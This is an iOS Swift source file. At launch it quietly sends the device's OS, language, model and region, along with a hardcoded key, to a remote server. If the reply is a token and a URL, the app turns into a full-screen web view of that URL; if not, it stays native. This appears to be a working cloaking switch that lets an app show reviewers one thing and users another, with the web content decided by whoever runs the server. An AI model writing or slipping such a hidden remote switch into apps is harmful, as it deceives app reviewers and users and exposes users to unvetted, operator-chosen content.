import SwiftUI
import WebKit
import UIKit
import PhotosUI
import Combine

enum UniqueSecureError: Error {
    case notFound
    case unexpectedStatus(OSStatus)
}

struct UniqueRemoteConfig {
    static let vKey   = "GJDFHDFHFDJGSDAGKGHK"
    static let srvURL = "https://wallen-eatery.space/ios-ha-19/server.php"
    static let accKey = "Bs2675kDjkb5Ga"
    static let cURL   = "cachedTrustedURL"
    static let cToken = "cachedVerificationToken"
}

func uniqueDeviceSystem() -> String {
    let info = "\(UIDevice.current.systemName) \(UIDevice.current.systemVersion)"
    return info
}

func uniqueDeviceLang() -> String {
    let lang = Locale.preferredLanguages.first ?? "en"
    let code = lang.components(separatedBy: "-").first?.lowercased() ?? "en"
    return code
}

func uniqueDeviceModel() -> String {
    var sys = utsname()
    uname(&sys)
    let model = Mirror(reflecting: sys.machine).children.reduce(into: "") { result, element in
        if let value = element.value as? Int8, value != 0 {
            result.append(Character(UnicodeScalar(UInt8(value))))
        }
    }
    return model
}

func uniqueDeviceRegion() -> String? {
    let region = Locale.current.regionCode
    return region
}

func uniqueSaveValue(key: String, value: String) throws {
    let data = Data(value.utf8)
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key
    ]
    let attributes: [String: Any] = [kSecValueData as String: data]
    
    let status = SecItemCopyMatching(query as CFDictionary, nil)
    if status == errSecSuccess {
        let update = SecItemUpdate(query as CFDictionary, attributes as CFDictionary)
        guard update == errSecSuccess else { throw UniqueSecureError.unexpectedStatus(update) }
    } else if status == errSecItemNotFound {
        var newItem = query
        newItem[kSecValueData as String] = data
        let add = SecItemAdd(newItem as CFDictionary, nil)
        guard add == errSecSuccess else { throw UniqueSecureError.unexpectedStatus(add) }
    } else {
        throw UniqueSecureError.unexpectedStatus(status)
    }
}

func uniqueLoadValue(key: String) throws -> String {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecReturnData as String: true,
        kSecMatchLimit as String: kSecMatchLimitOne
    ]
    var result: AnyObject?
    let status = SecItemCopyMatching(query as CFDictionary, &result)
    
    if status == errSecSuccess {
        guard let data = result as? Data,
              let value = String(data: data, encoding: .utf8) else {
            throw UniqueSecureError.unexpectedStatus(status)
        }
        return value
    } else if status == errSecItemNotFound {
        throw UniqueSecureError.notFound
    } else {
        throw UniqueSecureError.unexpectedStatus(status)
    }
}

@MainActor
final class UniqueAccess: ObservableObject {
    @Published var state = State.idle
    
    enum State {
        case idle, validating
        case approved(token: String, url: URL)
        case native
    }
    
    func start() {
        if let cachedURLString = UserDefaults.standard.string(forKey: UniqueRemoteConfig.cURL),
           let cachedURL = URL(string: cachedURLString),
           let savedToken = try? uniqueLoadValue(key: UniqueRemoteConfig.cToken),
           savedToken == UniqueRemoteConfig.vKey {
            state = .approved(token: savedToken, url: cachedURL)
            return
        }
        Task { await validateServer() }
    }
    
    private func validateServer() async {
        state = .validating
        
        guard let requestURL = makeRequestURL() else {
            state = .native
            return
        }
        
        let maxRetries = 3
        for attempt in 1...maxRetries {
            do {
                let response = try await fetchServer(from: requestURL)
                let segments = response.trimmingCharacters(in: .whitespacesAndNewlines).components(separatedBy: "#")
                if segments.count == 2,
                   segments[0] == UniqueRemoteConfig.vKey,
                   let validURL = URL(string: segments[1]) {
                    UserDefaults.standard.set(validURL.absoluteString, forKey: UniqueRemoteConfig.cURL)
                    try? uniqueSaveValue(key: UniqueRemoteConfig.cToken, value: segments[0])
                    state = .approved(token: segments[0], url: validURL)
                    return
                } else {
                    state = .native
                    return
                }
            } catch {
                if attempt < maxRetries {
                    let delay = min(pow(2.0, Double(attempt)), 30.0)
                    try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
                } else {
                    state = .native
                    return
                }
            }
        }
    }
    
    private func fetchServer(from url: URL) async throws -> String {
        let (data, _) = try await URLSession.shared.data(from: url)
        return String(decoding: data, as: UTF8.self)
    }
    
    private func makeRequestURL() -> URL? {
        var components = URLComponents(string: UniqueRemoteConfig.srvURL)
        components?.queryItems = [
            URLQueryItem(name: "p", value: UniqueRemoteConfig.accKey),
            URLQueryItem(name: "os", value: uniqueDeviceSystem()),
            URLQueryItem(name: "lng", value: uniqueDeviceLang()),
            URLQueryItem(name: "devicemodel", value: uniqueDeviceModel())
        ]
        if let country = uniqueDeviceRegion() {
            components?.queryItems?.append(URLQueryItem(name: "country", value: country))
        }
        return components?.url
    }
}

@available(iOS 14.0, *)
final class UniqueWebHost: UIViewController, WKUIDelegate, WKNavigationDelegate, UIDocumentPickerDelegate, PHPickerViewControllerDelegate {
    
    var onLoad: ((Bool) -> Void)?
    private var webView: WKWebView!
    private var initURL: URL
    fileprivate var fileCompletion: (([URL]?) -> Void)?
    
    init(url: URL) {
        self.initURL = url
        super.init(nibName: nil, bundle: nil)
        setupWebView()
    }
    
    required init?(coder: NSCoder) { fatalError() }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        
        if #available(iOS 11.0, *) {
            webView.insetsLayoutMarginsFromSafeArea = false
            webView.scrollView.contentInsetAdjustmentBehavior = .never
        }
        
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
        
        onLoad?(true)
        webView.load(URLRequest(url: initURL))
    }
    
    private func setupWebView() {
        let config = WKWebViewConfiguration()
        config.preferences.javaScriptEnabled = true
        config.websiteDataStore = .default()
        
        webView = WKWebView(frame: .zero, configuration: config)
        webView.uiDelegate = self
        webView.navigationDelegate = self
        webView.scrollView.bounces = false
        webView.scrollView.minimumZoomScale = 1.0
        webView.scrollView.maximumZoomScale = 1.0
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        onLoad?(false)
    }
    
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        onLoad?(false)
    }
}

@available(iOS 14.0, *)
extension UniqueWebHost: UIDocumentPickerDelegate, PHPickerViewControllerDelegate {
    
    func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
        fileCompletion?(urls)
    }
    
    func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
        fileCompletion?(nil)
    }
    
    func picker(_ picker: PHPickerViewController, didFinishPicking results: [PHPickerResult]) {
        picker.dismiss(animated: true)
        
        var pickedURLs: [URL] = []
        let group = DispatchGroup()
        
        for provider in results.map({ $0.itemProvider }) {
            if provider.hasItemConformingToTypeIdentifier(UTType.image.identifier) {
                group.enter()
                provider.loadFileRepresentation(forTypeIdentifier: UTType.image.identifier) { url, _ in
                    if let url = url {
                        pickedURLs.append(url)
                    }
                    group.leave()
                }
            }
        }
        
        group.notify(queue: .main) {
            self.fileCompletion?(pickedURLs.isEmpty ? nil : pickedURLs)
        }
    }
    
    func showFilePicker(completion: @escaping ([URL]?) -> Void) {
        self.fileCompletion = completion
        
        let alert = UIAlertController(title: "Choose File", message: nil, preferredStyle: .actionSheet)
        
        alert.addAction(UIAlertAction(title: "Photo/Video", style: .default) { _ in
            var config = PHPickerConfiguration(photoLibrary: .shared())
            config.selectionLimit = 1
            config.filter = .any(of: [.images, .videos])
            
            let picker = PHPickerViewController(configuration: config)
            picker.delegate = self
            self.present(picker, animated: true)
        })
        
        alert.addAction(UIAlertAction(title: "Files", style: .default) { _ in
            let picker = UIDocumentPickerViewController(forOpeningContentTypes: [.item], asCopy: true)
            picker.delegate = self
            picker.allowsMultipleSelection = false
            self.present(picker, animated: true)
        })
        
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel) { _ in
            completion(nil)
        })
        
        self.present(alert, animated: true)
    }
}

@available(iOS 14.0, *)
struct UniqueWebView: UIViewControllerRepresentable {
    let url: URL
    @Binding var loading: Bool
    
    func makeUIViewController(context: Context) -> UniqueWebHost {
        let vc = UniqueWebHost(url: url)
        vc.onLoad = { active in
            DispatchQueue.main.async { loading = active }
        }
        return vc
    }
    
    func updateUIViewController(_ vc: UniqueWebHost, context: Context) {}
}
